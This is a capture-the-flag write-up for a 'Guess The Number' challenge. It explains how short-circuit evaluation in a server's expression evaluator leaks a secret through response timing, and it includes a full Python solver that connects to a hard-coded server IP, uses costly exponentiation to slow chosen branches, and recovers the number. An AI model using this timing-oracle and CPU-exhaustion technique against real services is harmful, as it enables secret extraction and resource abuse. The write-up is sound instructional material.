# Guess The Number CTF - Solution Writeup

## Challenge Description
The goal is to guess a 100-bit secret number $x$ randomly generated by the server. We have 50 queries to interact with an expression evaluator that evaluates a dictionary-based expression against $x$.

## Vulnerability: Side-Channel Timing Attack
The evaluator implements logical `and` and `or` operations using Python's native operators.

```python
match exp['op']:
    case "and":
        return evaluate(exp['arg1'], x) and evaluate(exp['arg2'], x)
    case "or":
        return evaluate(exp['arg1'], x) or evaluate(exp['arg2'], x)
```

In Python, these operators **short-circuit**:
- `A and B`: If `A` is false, `B` is never evaluated.
- `A or B`: If `A` is true, `B` is never evaluated.

By placing a computationally expensive task (like `9**P`) in the second argument `B`, we can detect if `A` was evaluated to its short-circuiting value by measuring the server's response time.

## Exploitation Plan
With 50 queries, we can extract 2 bits per query using 4 intervals.

### Mapping Timing/Result to Quadrants
1. **Q0** ($x < 1/4$): FAST / Result NO
2. **Q1** ($1/4 \le x < 2/4$): SLOW / Result NO
3. **Q2** ($2/4 \le x < 3/4$): FAST / Result YES
4. **Q3** ($x \ge 3/4$): SLOW / Result YES

### Payload Expression
The constructed expression ensures the "heavy" part only runs in specific branches:
- `(x >= Half and ((x >= Q3 and DelayTrue) or True)) or (x >= Q1 and DelayFalse)`

## Solver Script
The follow script was used to correctly identify the secret number and retrieve the flag.

```python
import socket
import time
import sys

# Flush stdout
def log(msg):
    print(msg)
    sys.stdout.flush()

HOST = '35.231.13.90'
PORT = 5000

MAX_NUM = 1<<100
QUOTA = 50

class Connection:
    def __init__(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.settimeout(60.0)
        self.s.connect((HOST, PORT))
        self.buf = b""

    def recv_until_prompt(self):
        self.s.settimeout(60.0)
        try:
            while b"Input your expression" not in self.buf and b"Guess the number" not in self.buf:
                chunk = self.s.recv(4096)
                if not chunk:
                    break
                self.buf += chunk
        except socket.timeout:
            log("TIMEOUT in recv_until_prompt")
        ret = self.buf
        self.buf = b"" 
        return ret
    
    def send_query(self, query):
        self.s.sendall(str(query).encode() + b"\n")
    
    def recv_response(self):
        start = time.time()
        while b"Yes!" not in self.buf and b"No!" not in self.buf:
            chunk = self.s.recv(4096)
            if not chunk:
                break
            self.buf += chunk
        end = time.time()
        is_yes = b"Yes!" in self.buf
        ret_buf = self.buf
        self.buf = b""
        return is_yes, end - start, ret_buf

    def close(self):
        self.s.close()
        
    def recv_all(self):
        data = b""
        self.s.settimeout(5.0)
        try:
            while True:
                chunk = self.s.recv(4096)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        return data

def build_delay_node(p):
    return {'op': '**', 'arg1': 9, 'arg2': p}

def build_delay_true(p):
    return {'op': '>', 'arg1': build_delay_node(p), 'arg2': 0}

def build_delay_false(p):
    return {'op': '<', 'arg1': build_delay_node(p), 'arg2': 0}

def build_query_exp(val_50, val_75, val_25, p):
    term_75 = {'op': 'and', 'arg1': {'op': '>=', 'arg1': 'x', 'arg2': val_75}, 'arg2': build_delay_true(p)}
    term_upper = {'op': 'or', 'arg1': term_75, 'arg2': True}
    term_halftop = {'op': 'and', 'arg1': {'op': '>=', 'arg1': 'x', 'arg2': val_50}, 'arg2': term_upper}
    term_25 = {'op': 'and', 'arg1': {'op': '>=', 'arg1': 'x', 'arg2': val_25}, 'arg2': build_delay_false(p)}
    full = {'op': 'or', 'arg1': term_halftop, 'arg2': term_25}
    return full

def solve():
    log(f"Connecting to {HOST}:{PORT}")
    conn = Connection()
    log(f"Prompt: {conn.recv_until_prompt()}")
    
    log("Calibrating...")
    conn.send_query({'op': '>', 'arg1': 1, 'arg2': 0})
    is_yes, dur, raw = conn.recv_response()
    avg_fast = dur
    
    if b"Input" not in raw:
        conn.recv_until_prompt()
        
    p = 2000000
    q = {'op': 'and', 'arg1': True, 'arg2': build_delay_true(p)}
    conn.send_query(q)
    is_yes, dur, raw = conn.recv_response()
    
    # Adjust P for server speed
    if dur > 5.0:
        p = 600000 
    
    threshold = avg_fast + 1.2 # Safety margin
    conn.close()
    
    log(f"Reconnecting for exploit stage (P={p}, T={threshold:.2f}s)...")
    conn = Connection()
    conn.recv_until_prompt()
    
    low = 0
    high = MAX_NUM + 1
    
    for i in range(QUOTA):
        size = high - low
        step = size // 4
        val_25 = low + step
        val_50 = low + 2*step
        val_75 = low + 3*step
        
        query = build_query_exp(val_50, val_75, val_25, p)
        conn.send_query(query)
        
        is_yes, dur, raw = conn.recv_response()
        is_slow = dur > threshold
        
        if not is_yes and not is_slow: # Q0
            high = val_25
        elif not is_yes and is_slow: # Q1
            low = val_25
            high = val_50
        elif is_yes and not is_slow: # Q2
            low = val_50
            high = val_75
        elif is_yes and is_slow: # Q3
            low = val_75
            
        if b"Input" not in raw and b"Guess" not in raw and i < QUOTA-1:
            conn.recv_until_prompt()
            
    log(f"Final guess: {low}")
    conn.s.sendall(str(low).encode() + b"\n")
    final = conn.recv_all()
    log(f"FINAL OUTPUT: {final}")
    conn.close()

if __name__ == "__main__":
    solve()
```

## Flag
**uoftctf{h0w_did_y0u_gu3ss_7h3_numb3r}**
